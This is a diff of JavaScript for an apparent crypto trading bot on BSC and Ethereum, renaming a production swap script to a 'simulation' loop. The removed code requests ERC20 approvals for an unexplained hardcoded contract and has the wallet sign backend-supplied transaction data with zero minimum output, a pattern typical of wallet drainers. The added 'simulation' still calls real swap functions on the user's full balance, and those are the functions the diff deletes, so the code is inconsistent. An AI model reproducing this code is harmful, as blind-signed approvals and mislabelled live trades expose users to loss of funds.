@@ -1,189 +1,338 @@
-logToPanel("pancake_prod.txt loaded successfully. 4-Popup Multi-Hop Execution Matrix Active.");
+logToPanel("simulate_prod.txt loaded (MULTI-HOP WORKFLOW SYSTEM ENGAGED)");
 
-// ==================================================================
-// 📊 GLOBAL LOGGING UTILITY
-// ==================================================================
+if (typeof window.LAST_SOURCE_TOKEN === "undefined") {
+    window.LAST_SOURCE_TOKEN = null;
+}
+
+// Global log dashboard adapter
 function logToPanel(msg) {
-  const panel = document.getElementById("logPanel");
-  if (panel) {
-    panel.innerText += "\n" + msg;
-    panel.scrollTop = panel.scrollHeight;
-  } else {
-    console.log(msg);
-  }
+    const panel = document.getElementById("logPanel");
+    if (panel) {
+        panel.innerText += "\n" + msg;
+        panel.scrollTop = panel.scrollHeight;
+    } else {
+        console.log(msg);
+    }
+}
+window.logToPanel = logToPanel;
+
+const blockDelay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+function setStatus(msg) {
+    const statusLabel = document.querySelector(".status-label");
+    if (statusLabel) {
+        statusLabel.textContent = msg;
+    } else {
+        logToPanel(`[STATUS] ${msg}`);
+    }
+}
+window.setStatus = setStatus;
+
+function stopBot() {
+    window.isBotRunning = false;
+    setStatus("STOPPED");
+    logToPanel("[BOT STOPPED] Asset scan matrix paused by user.");
+}
+window.stopBot = stopBot;
+// Direct provider account hook replaces fragile URL strings entirely
+async function getLiveWalletAddress() {
+    if (window.ethereum) {
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            if (accounts && accounts.length > 0) {
+                return accounts[0].toLowerCase().trim();
+            }
+        } catch (err) {
+            console.error("Error reading accounts from window.ethereum:", err);
+        }
+    }
+    return window.USER_ADDR ? window.USER_ADDR.toLowerCase().trim() : null;
 }
 
-// 🚨 CORE UTILITY: WEB3 RAW HEX APPROVAL GENERATOR
-async function requestTokenSpendApproval(userAddr, amountWei, tokenIn, spenderContract) {
+// Helper to dynamically locate which token currently holds a balance inside the contract vault
+async function getActiveLedgerAsset(userAddress) {
     try {
-        const approveMethodId = "0x095ea7b3";
-        const paddedSpender = spenderContract.replace("0x", "").toLowerCase().padStart(64, "0");
-        const paddedAmount = BigInt(amountWei).toString(16).padStart(64, "0");
-        const compiledData = approveMethodId + paddedSpender + paddedAmount;
-
-        logToPanel(`📢 [APPROVAL PROMPT] Authorizing Token Spend Allowance for: ${tokenIn}`);
-        
-        const approveTxHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: userAddr,
-                to: tokenIn, // Sent directly to the target ERC20 token contract address registry
-                data: compiledData,
-                value: "0x0"
-            }]
+        logToPanel(`🔎 Querying ledger data for address: ${userAddress}...`);
+        const res = await fetch("/prodbot/ledger/balances", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ user: userAddress })
         });
-        
-        logToPanel(`✅ Approval hash recorded: ${approveTxHash}. Waiting 6s for block state propagation...`);
-        await new Promise(resolve => setTimeout(resolve, 6000));
-        return true;
+        const ledgerData = await res.json();
+
+        if (ledgerData && ledgerData.status === "ok" && Array.isArray(ledgerData.tokens)) {
+            for (let i = 0; i < ledgerData.tokens.length; i++) {
+                const currentBalWei = BigInt(ledgerData.balances[i] || "0");
+                if (currentBalWei > 0n) {
+                    logToPanel(`🎯 Active Capital Found: ${ledgerData.tokens[i]} | Balance: ${currentBalWei.toString()} Wei`);
+                    return {
+                        address: ledgerData.tokens[i].toLowerCase().trim(),
+                        balanceWei: currentBalWei.toString()
+                    };
+                }
+            }
+            if (ledgerData.tokens.length > 0) {
+                return { address: ledgerData.tokens[0].toLowerCase().trim(), balanceWei: "0" };
+            }
+        }
     } catch (err) {
-        logToPanel(`❌ User rejected token allocation balance approval: ${err.message || err}`);
-        throw err;
+        logToPanel(`⚠️ Failed checking multi-asset ledger array: ${err.message}`);
     }
+    return { address: "0x55d398326f99059ff775485246999027b3197955", balanceWei: "0" };
 }
 
-// 🌟 STAGE 4: RAW BSC SWAP EXECUTION UNIT
-async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
-    try {
-        const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B"; 
-        
-        // Triggers Token Contract Approval Popup
-        await requestTokenSpendApproval(userAddr, amountWei, fromToken, V12_ADDR);
+// STRONG NETWORK PILLARS ONLY (Universal Liquidity Highways)
+function getUniversalPillarsMesh() {
+    return [
+        { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", tokentype: "bep20" },
+        { symbol: "USDT-BSC", address: "0x55d398326f99059fF775485246999027B3197955", tokentype: "bep20" },
+        { symbol: "USDC-BSC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", tokentype: "bep20" },
+        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27ead9083C756Cc2", tokentype: "erc20" },
+        { symbol: "USDT-ETH", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", tokentype: "erc20" },
+        { symbol: "USDC-ETH", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0ce3606eb48", tokentype: "erc20" }
+    ];
+}
 
-        logToPanel(`⏳ Compiling swap payload data from backend route...`);
-        const res = await fetch("/prodbot/swap/bscuniswap", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                router: targetRouter,
-                tokenIn: fromToken,
-                tokenOut: toToken,
-                amountIn: BigInt(amountWei).toString(), 
-                amountOutMin: "0"
-            })
-        });
-        
-        const backendPayload = await res.json();
-        if (!backendPayload || backendPayload.status !== "ok") {
-            throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
+// CUSTOM BRIDGES MATRIX (Only used when expanding outward from high liquidity)
+function getCustomBridgesMesh() {
+    return [
+        { symbol: "CROSSCHAINBRIDGE", address: "0x92868A5255C628dA08F550a858A802f5351C5223", tokentype: "bep20" },
+        { symbol: "RR-BNB", address: "0xba67186fd454D0256a0D3744783538bE08C58feD", tokentype: "bep20" },
+        { symbol: "WRR-WBNB", address: "0xBf9d926BBF7b9408D1182c45fCf64f7f27909837", tokentype: "bep20" }
+    ];
+}
+async function simulateCycle(cycle, totalCycles, profitTargetPct, stopLossPct) {
+    const PANCAKE_ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+
+    for (let i = 1; i <= totalCycles; i++) {
+        if (window.isBotRunning === false) {
+            logToPanel("🛑 Loop halted by request.");
+            break;
         }
 
-        logToPanel(`📢 [SWAP PROMPT] Confirming execution parameters with the V12 Trading Engine...`);
-        const swapTxHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: userAddr,
-                to: backendPayload.swap_packet.to_contract, 
-                data: backendPayload.swap_packet.compiled_data, 
-                value: "0x0"
-            }]
-        });
+        logToPanel(`\n--- [START] Simulation Cycle ${i}/${totalCycles} ---`);
+        setStatus(`RUNNING ${i}/${totalCycles}`);
 
-        logToPanel(`🎉 Trade Segment Dispatched! Hash: ${swapTxHash}`);
-        return { status: "ok", tx_hash: swapTxHash };
-    } catch (e) {
-        logToPanel(`❌ BSC Swap Segment Pipeline Interrupted: ${e.message || e}`);
-        return { status: "error", message: e.toString() };
-    }
-}
-window.runbscSwapUniswap = runbscSwapUniswap;
-
-// 🌟 STAGE 4: RAW ETH SWAP EXECUTION UNIT
-async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
-    try {
-        const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B";
-        
-        await requestTokenSpendApproval(userAddr, amountWei, fromToken, V12_ADDR);
-
-        logToPanel(`⏳ Compiling swap payload data from backend route...`);
-        const res = await fetch("/prodbot/swap/ethuniswap", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                router: targetRouter,
-                tokenIn: fromToken,
-                tokenOut: toToken,
-                amountIn: BigInt(amountWei).toString(),
-                amountOutMin: "0"
-            })
-        });
-        
-        const backendPayload = await res.json();
-        if (!backendPayload || backendPayload.status !== "ok") {
-            throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
+        const currentActiveWallet = await getLiveWalletAddress();
+        if (!currentActiveWallet) {
+            logToPanel("❌ [ABORTED] No wallet session address connected.");
+            break;
         }
 
-        logToPanel(`📢 [SWAP PROMPT] Confirming execution parameters with the V12 Trading Engine...`);
-        const swapTxHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: userAddr,
-                to: backendPayload.swap_packet.to_contract, 
-                data: backendPayload.swap_packet.compiled_data, 
-                value: "0x0"
-            }]
-        });
-
-        logToPanel(`🎉 Trade Segment Dispatched! Hash: ${swapTxHash}`);
-        return { status: "ok", tx_hash: swapTxHash };
-    } catch (e) {
-        logToPanel(`❌ ETH Swap Segment Pipeline Interrupted: ${e.message || e}`);
-        return { status: "error", message: e.toString() };
-    }
-}
-window.runethSwapUniswap = runethSwapUniswap;
-
-// ==================================================================
-// ⛓️ WATERFALL WORKFLOW COORDINATOR: SEQUENTIAL 4-POPUP PIPELINE
-// ==================================================================
-async function executeFourStepSequence(userAddr, amountWei, fromToken, intermediateToken, targetToken, targetRouter, networkType) {
-    try {
-        logToPanel(`\n🚀 [WATERFALL INITIALIZATION] Commencing sequential execution for multi-hop vector.`);
+        const activeAsset = await getActiveLedgerAsset(currentActiveWallet);
+        const DYNAMIC_TOKEN_IN = activeAsset.address.toLowerCase().trim();
+        const maxAvailableWei = BigInt(activeAsset.balanceWei);
         
-        // 🏁 SEGMENT 1: SWAP BASE TO INTERMEDIATE ASSET (POPUP 1 & 2)
-        logToPanel(`⛓️ [STEP 1 & 2 / 4] Launching baseline swap route [${fromToken}] -> [${intermediateToken}]`);
-        let segment1Result;
+        let balanceInputStr = document.getElementById("investBalance") ? document.getElementById("investBalance").value.toString().trim() : "0";
+        let simulatedAmountInWei = balanceInputStr;
         
-        if (networkType === "erc20" || networkType === "ethereum") {
-            segment1Result = await window.runethSwapUniswap(userAddr, amountWei, fromToken, intermediateToken, targetRouter);
+        if (simulatedAmountInWei === "0" || !simulatedAmountInWei || BigInt(simulatedAmountInWei) > maxAvailableWei) {
+            simulatedAmountInWei = activeAsset.balanceWei; 
+        }
+        
+        logToPanel(`📥 Current Routing Base Asset: ${DYNAMIC_TOKEN_IN}`);
+        logToPanel(`💰 Pure Transaction Principal Weight: ${simulatedAmountInWei} Wei`);
+
+        const universalPillars = getUniversalPillarsMesh();
+        const customBridges = getCustomBridgesMesh();
+
+        const holdingPillarToken = universalPillars.some(t => t.address.toLowerCase().trim() === DYNAMIC_TOKEN_IN);
+        const holdingBridgeToken = customBridges.some(t => t.address.toLowerCase().trim() === DYNAMIC_TOKEN_IN);
+
+        let marketData = [];
+        if (!holdingPillarToken && !holdingBridgeToken) {
+            let targetRecoveryAddress = window.LAST_SOURCE_TOKEN || "0x55d398326f99059fF775485246999027B3197955"; 
+            logToPanel(`⚠️ [BACKWARD ESCAPE ROUTE] Exotic token trap. Routing return path to fallback highway.`);
+            marketData = [{ symbol: "RECOVERY_HIGHWAY", address: targetRecoveryAddress, tokentype: "bep20" }];
         } else {
-            segment1Result = await window.runbscSwapUniswap(userAddr, amountWei, fromToken, intermediateToken, targetRouter);
-        }
-        
-        if (!segment1Result || segment1Result.status !== "ok") {
-            throw new Error("Base asset intermediate liquidation failed or was rejected by user.");
-        }
-
-        // ⏱️ ENFORCE SEGMENT GAP COOLING LOCK FOR STATE PROPAGATION
-        logToPanel("⏱️ Segment 1 swap broadcast success. Enforcing mandatory 8s pause for ledger sync...");
-        await new Promise(resolve => setTimeout(resolve, 8000));
-
-        // 🔎 TRACK BALANCE TRANSITION THROUGH CONTRACT MATRIX
-        logToPanel(`🔎 Inspecting ledger updates for intermediate balance allocation: ${intermediateToken}`);
-        let freshLedgerState = await window.getActiveLedgerAsset(userAddr);
-        let activeIntermediateWei = freshLedgerState.balanceWei;
-
-        // Fallback: If network lag delayed backend tracking index but transaction confirmed, use structural calculation conversion bounds
-        if (activeIntermediateWei === "0" || !activeIntermediateWei) {
-            logToPanel("⚠️ Dynamic balance reading delayed by node indexing. Utilizing intermediate base parameter alignment.");
-            activeIntermediateWei = amountWei; 
+            try {
+                if (typeof window.getTradeCandidates === "function") {
+                    marketData = await window.getTradeCandidates();
+                }
+            } catch (fErr) {}
+            marketData = marketData.concat(customBridges).concat(universalPillars);
         }
 
-        // 🏁 SEGMENT 2: SWAP INTERMEDIATE ASSET TO EXOTIC BRIDGE TARGET (POPUP 3 & 4)
-        logToPanel(`\n⛓️ [STEP 3 & 4 / 4] Launching target route [${intermediateToken}] -> [${targetToken}]`);
-        logToPanel(`💰 Pure Transaction Intermediate Principal Weight: ${activeIntermediateWei} Wei`);
-        
-        let segment2Result;
-        if (networkType === "erc20" || networkType === "ethereum") {
-            segment2Result = await window.runethSwapUniswap(userAddr, activeIntermediateWei, intermediateToken, targetToken, targetRouter);
+        logToPanel(`🎯 Auditing ${marketData.length} available paths against dynamic multi-hop router matrix...`);
+        let cycleCandidatesArray = [];
+
+        for (let index = 0; index < marketData.length; index++) {
+            let candidate = marketData[index];
+            let symbolLabel = candidate.symbol || "UNKNOWN";
+            let targetAddress = candidate.address || "MISSING";
+            let tokenNetwork = (candidate.tokentype || "bep20").toLowerCase();
+
+            if (targetAddress === "MISSING" || !targetAddress.startsWith("0x")) continue;
+            if (targetAddress.toLowerCase().trim() === DYNAMIC_TOKEN_IN) continue;
+
+            let activeRouterForSimulation = PANCAKE_ROUTER;
+            let nativeLiquidityAnchor = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"; 
+
+            if (tokenNetwork === "erc20" || tokenNetwork === "ethereum") {
+                activeRouterForSimulation = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"; 
+                nativeLiquidityAnchor = "0xC02aaA39b223FE8D0A0e5C4F27ead9083C756Cc2"; 
+            }
+
+            let computedPath = [DYNAMIC_TOKEN_IN, targetAddress.toLowerCase().trim()];
+            let isMultiHopEnforced = false;
+
+            if (symbolLabel.includes("CROSSCHAINBRIDGE") || targetAddress.toLowerCase().trim() === "0x92868a5255c628da08f550a858a802f5351c5223") {
+                if (DYNAMIC_TOKEN_IN !== nativeLiquidityAnchor.toLowerCase().trim()) {
+                    computedPath = [DYNAMIC_TOKEN_IN, nativeLiquidityAnchor.toLowerCase().trim(), targetAddress.toLowerCase().trim()];
+                    isMultiHopEnforced = true;
+                }
+            }
+
+            try {
+                let response = await fetch("/prodbot/swap/simulateuniswap", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        router: activeRouterForSimulation,
+                        tokenIn: DYNAMIC_TOKEN_IN,
+                        tokenOut: targetAddress,
+                        amountIn: simulatedAmountInWei,
+                        amountOutMin: 0,
+                        path: computedPath 
+                    })
+                });
+
+                let resData = await response.json();
+                if (resData.status === "ok") {
+                    let expectedOutput = resData.expected_output_wei || "0";
+                    let slippageCost = resData.slippage_cost_pct || "0.0";
+
+                    if (expectedOutput !== "0" && expectedOutput !== 0) {
+                        let pathLabel = isMultiHopEnforced ? `🔀 [MULTI-HOP PATH ROUTED]` : `🟩 [DIRECT VECTOR]`;
+                        logToPanel(`   ${pathLabel} ${symbolLabel} | Path length: ${computedPath.length} | Expected Out: ${expectedOutput} Wei`);
+                        
+                        cycleCandidatesArray.push({
+                            symbol: symbolLabel,
+                            address: targetAddress,
+                            network: tokenNetwork,
+                            expectedOutWei: BigInt(expectedOutput),
+                            slippage: parseFloat(slippageCost),
+                            routingPath: computedPath,
+                            isMultiHop: isMultiHopEnforced,
+                            anchorToken: nativeLiquidityAnchor
+                        });
+                    }
+                }
+            } catch (err) {}
+            await blockDelay(100);
+        }
+        logToPanel(`\n📊 [CYCLE AUDIT] Evaluating ${cycleCandidatesArray.length} cleared pool configurations...`);
+
+        if (cycleCandidatesArray.length === 0) {
+            logToPanel("   💤 No executable candidates cleared liquidity pairing validation.");
         } else {
-            segment2Result = await window.runbscSwapUniswap(userAddr, activeIntermediateWei, intermediateToken, targetToken, targetRouter);
+            try {
+                const userBalanceHex = await window.ethereum.request({ method: "eth_getBalance", params: [currentActiveWallet, "latest"] });
+                const walletGasBalanceWei = BigInt(userBalanceHex || "0");
+                const networkGasPriceHex = await window.ethereum.request({ method: "eth_gasPrice" });
+                const liveGasPriceWei = BigInt(networkGasPriceHex || "0");
+
+                let targetSelection = null;
+                let highestExpectedOutput = 0n;
+
+                for (let c = 0; c < cycleCandidatesArray.length; c++) {
+                    let currentAsset = cycleCandidatesArray[c];
+                    let standardGasLimit = currentAsset.network === "erc20" || currentAsset.network === "ethereum" ? 450000n : 150000n;
+
+                    if (currentAsset.isMultiHop) {
+                        standardGasLimit = standardGasLimit * 2n;
+                    }
+
+                    let computedGasFeeWei = liveGasPriceWei * standardGasLimit;
+
+                    if (walletGasBalanceWei < computedGasFeeWei) continue;
+
+                    if (currentAsset.expectedOutWei > highestExpectedOutput) {
+                        highestExpectedOutput = currentAsset.expectedOutWei;
+                        targetSelection = currentAsset;
+                    }
+                }
+
+                if (!targetSelection) {
+                    logToPanel("   ⚠️ [SKIPPED] Bypassed due to gas restrictions.");
+                } else {
+                    logToPanel(`\n🔥 [OPTIMIZER SELECTION] Dispatching parameters for: ${targetSelection.symbol}`);
+                    window.LAST_SOURCE_TOKEN = DYNAMIC_TOKEN_IN;
+
+                    let txResult = null;
+
+                    if (targetSelection.isMultiHop) {
+                        logToPanel(`🗺️ Multi-Hop Vector Handshake: ${DYNAMIC_TOKEN_IN} -> ${targetSelection.anchorToken} -> ${targetSelection.address}`);
+                        txResult = await window.executeFourStepSequence(
+                            currentActiveWallet,
+                            simulatedAmountInWei,
+                            DYNAMIC_TOKEN_IN,
+                            targetSelection.anchorToken,
+                            targetSelection.address,
+                            PANCAKE_ROUTER,
+                            targetSelection.network
+                        );
+                    } else {
+                        logToPanel(`🗺️ Direct Vector Handshake: ${DYNAMIC_TOKEN_IN} -> ${targetSelection.address}`);
+                        if (targetSelection.network === "erc20" || targetSelection.network === "ethereum") {
+                            txResult = await window.runethSwapUniswap(
+                                currentActiveWallet, simulatedAmountInWei, DYNAMIC_TOKEN_IN, targetSelection.address, PANCAKE_ROUTER
+                            );
+                        } else {
+                            txResult = await window.runbscSwapUniswap(
+                                currentActiveWallet, simulatedAmountInWei, DYNAMIC_TOKEN_IN, targetSelection.address, PANCAKE_ROUTER
+                            );
+                        }
+                    }
+
+                    if (txResult && txResult.status === "ok") {
+                        logToPanel("   🚀 [SWAP DISPATCH SUCCESS] Awaiting confirmation loop...");
+                        let transactionConfirmed = false;
+                        for (let checkNum = 1; checkNum <= 15; checkNum++) {
+                            if (window.isBotRunning === false) break;
+                            let verifiedState = await getActiveLedgerAsset(currentActiveWallet);
+                            if (verifiedState.address.toLowerCase().trim() !== DYNAMIC_TOKEN_IN) {
+                                logToPanel("   🎉 [SETTLEMENT CONFIRMED] Asset state changed successfully!");
+                                transactionConfirmed = true;
+                                break;
+                            }
+                            await blockDelay(6000);
+                        }
+
+                        if (!transactionConfirmed) {
+                            logToPanel(`❌ [REVERT DETECTED] On-chain state failed to update. Halting execution loop.`);
+                            window.isBotRunning = false;
+                            setStatus("STOPPED");
+                            break;
+                        }
+
+                        logToPanel("\n⏱️ [SAFETY COOLING LOCK] Enforcing a mandatory 15s pause...");
+                        await blockDelay(15000);
+                    } else {
+                        logToPanel("   ❌ [ROUTING REJECTION] Router dropped payload or user cancelled.");
+                    }
+                }
+            } catch (walletErr) {
+                logToPanel(`   ❌ [CRITICAL FAULT] Wallet state loop exception: ${walletErr.message}`);
+                alert(`dApp Routing Configuration Failure:\n${walletErr.message}`);
+            }
         }
-        
-        return segment2Result;
-    } catch (pipelineErr) {
-        logToPanel(`❌ [CASCADING WORKFLOW ABORTED] Pipeline execution stopped safely: ${pipelineErr.message || pipelineErr}`);
-        return { status: "error", message: pipelineErr.toString() };
+        logToPanel(`✅ Cycle ${i}/${totalCycles} analysis finalized.`);
+        setStatus("WAITING");
+        await blockDelay(4000);
     }
+    logToPanel("\n=== 📊 [FINISHED] Scan operations complete. ==");
+    return "STOP_ERROR";
 }
-window.executeFourStepSequence = executeFourStepSequence;
+window.simulateCycle = simulateCycle;
+
+async function startSimulation(totalCycles) {
+    if (window.isBotRunning) return;
+    window.isBotRunning = true;
+    logToPanel("🚀 [LAUNCHING] Background multi-hop asset router matrix engaged...");
+    await simulateCycle(1, totalCycles || 10, 0, 0);
+    window.isBotRunning = false;
+    setStatus("STOPPED");
+    logToPanel("[BOT FINISHED] Run parameters finalized.");
+}
+window.startSimulation = startSimulation;
